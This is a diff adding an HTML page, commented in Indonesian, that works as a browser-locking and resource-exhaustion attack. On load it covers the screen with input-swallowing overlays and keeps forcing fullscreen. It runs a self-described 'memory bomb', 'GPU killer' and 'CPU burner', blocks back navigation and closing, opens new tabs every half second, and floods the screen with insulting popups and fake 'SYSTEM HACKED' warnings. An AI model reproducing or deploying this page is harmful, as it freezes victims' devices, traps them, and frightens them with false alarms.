@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ SYSTEM LOCKED ⚠️</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            width: 100vw;
+            position: relative;
+        }
+        
+        /* Popup utama - lebih banyak variasi */
+        .tiktok-popup {
+            position: absolute;
+            background: #1a1a1a;
+            color: #fff;
+            border-radius: 15px;
+            padding: 12px 18px;
+            border-left: 4px solid #ff0050;
+            white-space: nowrap;
+            font-size: 16px;
+            z-index: 1;
+            border: 1px solid #333;
+            pointer-events: none;
+            user-select: none;
+            animation: float 2s infinite ease-in-out;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+            100% { transform: translateY(0px) rotate(0deg); }
+        }
+        
+        .tiktok-popup::before {
+            content: "👤 bilansanız01";
+            position: absolute;
+            top: -15px;
+            left: 10px;
+            font-size: 11px;
+            color: #ff0050;
+            background: #1a1a1a;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+        
+        /* Popup mini (ribuan) */
+        .mini-popup {
+            position: absolute;
+            background: #ff0050;
+            color: #000;
+            font-size: 8px;
+            padding: 2px 4px;
+            border-radius: 3px;
+            white-space: nowrap;
+            z-index: 0;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        
+        /* Overlay penangkap event (3 lapis) */
+        .force-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 999999999;
+            cursor: default;
+            pointer-events: all;
+        }
+        
+        .backup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 999999998;
+            pointer-events: all;
+        }
+        
+        .final-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 999999997;
+            pointer-events: all;
+        }
+        
+        /* Counter */
+        .counter {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            color: #ff0050;
+            font-size: 12px;
+            z-index: 1000000000;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 20px;
+            border: 1px solid #ff0050;
+        }
+        
+        /* Peringatan */
+        .warning-text {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #ff0000;
+            font-size: 10px;
+            z-index: 1000000000;
+            animation: warningBlink 0.2s infinite;
+        }
+        
+        @keyframes warningBlink {
+            0% { opacity: 0.3; color: #ff0000; }
+            50% { opacity: 1; color: #ff0050; }
+            100% { opacity: 0.3; color: #ff0000; }
+        }
+        
+        .hidden-audio { display: none; }
+        
+        /* Overlay merah berkedip */
+        .red-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.05);
+            z-index: 999999990;
+            pointer-events: none;
+            animation: redPulse 0.1s infinite;
+        }
+        
+        @keyframes redPulse {
+            0% { opacity: 0.05; }
+            50% { opacity: 0.2; }
+            100% { opacity: 0.05; }
+        }
+        
+        /* Layar kacau */
+        .glitch-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                transparent, 
+                transparent 5px,
+                rgba(255,0,0,0.05) 5px,
+                rgba(255,0,0,0.05) 10px);
+            z-index: 999999991;
+            pointer-events: none;
+            animation: glitchMove 0.5s infinite;
+        }
+        
+        @keyframes glitchMove {
+            from { background-position: 0 0; }
+            to { background-position: 0 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="counter" id="counter">0 popup</div>
+    <div class="warning-text" id="warning">⚠️ SYSTEM OVERLOAD ⚠️</div>
+    <div class="red-overlay"></div>
+    <div class="glitch-layer"></div>
+    
+    <!-- 3 LAPISAN PENANGKAP -->
+    <div class="force-overlay" id="forceOverlay"></div>
+    <div class="backup-overlay" id="backupOverlay"></div>
+    <div class="final-overlay" id="finalOverlay"></div>
+    
+    <audio id="horrorAudio" loop>
+        <source src="data:audio/mp3;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAADIADExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExP///8AAAAATGF2YzU4LjEzAAAAAAAAAAAAAAAAJAAAAAAAAAAAAS/k9QAA" type="audio/mp3">
+    </audio>
+
+    <script>
+        (function() {
+            // ===== PLAY AUDIO (SUARA HOROR) =====
+            function playAudio() {
+                try {
+                    let audio = document.getElementById('horrorAudio');
+                    audio.volume = 1.0;
+                    audio.play();
+                    audio.addEventListener('ended', () => audio.play());
+                } catch(e) {}
+            }
+            playAudio();
+
+            // ===== 3 LAPISAN PENANGKAP EVENT =====
+            const overlay1 = document.getElementById('forceOverlay');
+            const overlay2 = document.getElementById('backupOverlay');
+            const overlay3 = document.getElementById('finalOverlay');
+            
+            const events = ['click', 'mousedown', 'mouseup', 'mousemove', 'touchstart', 'touchend', 'touchmove', 'keydown', 'keyup', 'contextmenu', 'wheel'];
+            
+            [overlay1, overlay2, overlay3].forEach(overlay => {
+                events.forEach(event => {
+                    overlay.addEventListener(event, (e) => {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        return false;
+                    }, { capture: true, passive: false });
+                });
+            });
+
+            // ===== LOCK SCREEN MAKSIMAL =====
+            function lockScreen() {
+                // Fullscreen paksa terus menerus
+                function forceFullscreen() {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    }
+                }
+                
+                forceFullscreen();
+                setInterval(forceFullscreen, 100);
+                
+                // Lock orientation
+                if (screen.orientation && screen.orientation.lock) {
+                    screen.orientation.lock('portrait').catch(() => {});
+                }
+                
+                // Cegah exit fullscreen
+                document.addEventListener('fullscreenchange', forceFullscreen);
+                document.addEventListener('webkitfullscreenchange', forceFullscreen);
+                document.addEventListener('mozfullscreenchange', forceFullscreen);
+            }
+            lockScreen();
+
+            // ===== KONFIGURASI POPUP =====
+            let popupCount = 0;
+            const counterEl = document.getElementById('counter');
+            const texts = [
+                'you are an idiot 😡😡😡', 
+                'bilansanız01 😡😡😡', 
+                '😡😡😡 idiot', 
+                'virus malware 🤬', 
+                'freeze ajg',
+                '💀 SYSTEM HACKED',
+                '⚠️ DATA CORRUPTED',
+                '🔥 OVERHEAT DETECTED',
+                '🛑 EMERGENCY SHUTDOWN',
+                '👁️ YOU ARE BEING WATCHED'
+            ];
+            
+            function createPopup() {
+                let popup = document.createElement('div');
+                popup.className = 'tiktok-popup';
+                popup.innerText = texts[Math.floor(Math.random() * texts.length)];
+                popup.style.left = Math.random() * (window.innerWidth + 200) - 100 + 'px';
+                popup.style.top = Math.random() * (window.innerHeight + 200) - 100 + 'px';
+                popup.style.fontSize = Math.floor(Math.random() * 30 + 14) + 'px';
+                popup.style.transform = `rotate(${Math.random() * 20 - 10}deg)`;
+                popup.style.animationDuration = (Math.random() * 3 + 1) + 's';
+                document.body.appendChild(popup);
+                
+                popupCount++;
+                counterEl.innerText = `${popupCount} popup | GPU: ${Math.min(100, Math.floor(popupCount / 50))}%`;
+            }
+
+            // ===== POPUP MINI (RIBUAN) =====
+            function createMiniPopup() {
+                for (let i = 0; i < 5; i++) {
+                    let mini = document.createElement('div');
+                    mini.className = 'mini-popup';
+                    mini.innerText = '😡';
+                    mini.style.left = Math.random() * window.innerWidth + 'px';
+                    mini.style.top = Math.random() * window.innerHeight + 'px';
+                    mini.style.background = `rgb(${Math.random()*255},0,0)`;
+                    document.body.appendChild(mini);
+                }
+            }
+
+            // ===== GPU KILLER EKSTRIM =====
+            function gpuKiller() {
+                // 5 canvas WebGL
+                for (let c = 0; c < 5; c++) {
+                    let canvas = document.createElement('canvas');
+                    canvas.width = 3000;
+                    canvas.height = 3000;
+                    canvas.style.position = 'fixed';
+                    canvas.style.top = '0';
+                    canvas.style.left = '0';
+                    canvas.style.opacity = '0.001';
+                    canvas.style.zIndex = '0';
+                    document.body.appendChild(canvas);
+                    
+                    let gl = canvas.getContext('webgl');
+                    if (gl) {
+                        setInterval(() => {
+                            for (let i = 0; i < 2000; i++) {
+                                gl.clear(gl.COLOR_BUFFER_BIT);
+                                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                            }
+                        }, 1);
+                    }
+                }
+                
+                // CSS animation super berat (1000 div)
+                let style = document.createElement('style');
+                style.innerHTML = `
+                    @keyframes brutal1 { 0% { transform: rotate(0deg) scale(1); } 100% { transform: rotate(360deg) scale(1000); } }
+                    @keyframes brutal2 { 0% { transform: translate(0,0); } 100% { transform: translate(1000px,1000px); } }
+                    @keyframes brutal3 { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
+                `;
+                document.head.appendChild(style);
+                
+                for (let i = 0; i < 1000; i++) {
+                    let div = document.createElement('div');
+                    div.style.position = 'fixed';
+                    div.style.width = '1px';
+                    div.style.height = '1px';
+                    div.style.animation = `brutal1 0.01s infinite, brutal2 0.02s infinite, brutal3 0.03s infinite`;
+                    document.body.appendChild(div);
+                }
+            }
+            
+            gpuKiller();
+
+            // ===== MEMORY BOMB MAKSIMAL =====
+            let mem = [];
+            for (let i = 0; i < 2000; i++) {
+                mem.push(new Uint8Array(1024 * 1024 * 100));
+            }
+            
+            // String raksasa
+            let hugeString = '';
+            for (let i = 0; i < 100; i++) {
+                hugeString += 'X'.repeat(1000000);
+            }
+
+            // ===== CPU BURNER MAKSIMAL =====
+            for (let i = 0; i < 500; i++) {
+                setInterval(() => {
+                    for (let j = 0; j < 100000; j++) {
+                        Math.sqrt(j) * Math.tan(j) * Math.sin(j) * Math.cos(j) * Math.asin(j) * Math.acos(j);
+                    }
+                }, 0);
+            }
+
+            // ===== BLOKIR BACK & CLOSE =====
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => {
+                for (let i = 0; i < 10; i++) {
+                    history.pushState(null, null, location.href);
+                }
+            };
+
+            window.onbeforeunload = () => "🔒 SYSTEM LOCKED - TIDAK BISA KELUAR 🔒";
+            
+            // Buka tab baru terus
+            setInterval(() => {
+                try {
+                    window.open(window.location.href, '_blank');
+                } catch(e) {}
+            }, 500);
+
+            // ===== POPUP MASSAL EKSTRIM =====
+            // 500 popup awal
+            for (let i = 0; i < 500; i++) {
+                setTimeout(createPopup, i * 5);
+                setTimeout(createMiniPopup, i * 2);
+            }
+            
+            // Tambah terus setiap 50ms
+            setInterval(() => {
+                for (let i = 0; i < 30; i++) {
+                    createPopup();
+                    createMiniPopup();
+                }
+            }, 50);
+
+            // ===== MONITOR FULLSCREEN =====
+            setInterval(() => {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen();
+                }
+            }, 50);
+
+            // ===== VIBRASI (kalo support) =====
+            setInterval(() => {
+                if (navigator.vibrate) {
+                    navigator.vibrate([100, 100, 100, 100, 100, 100, 100, 100, 100, 100]);
+                }
+            }, 1000);
+
+            // ===== WARNING TEXT BERUBAH =====
+            const warnings = [
+                '⚠️ SYSTEM OVERLOAD ⚠️',
+                '💀 KERNEL PANIC 💀',
+                '🔥 THERMAL THROTTLING 🔥',
+                '🛑 EMERGENCY PROTOCOL 🛑',
+                '🔴 FATAL ERROR 🔴'
+            ];
+            
+            setInterval(() => {
+                document.getElementById('warning').innerText = warnings[Math.floor(Math.random() * warnings.length)];
+            }, 200);
+
+            console.log("%c💀 ULTIMATE FREEZE MODE 💀", "color: red; font-size: 40px; font-weight: bold;");
+        })();
+    </script>
+</body>
+</html>
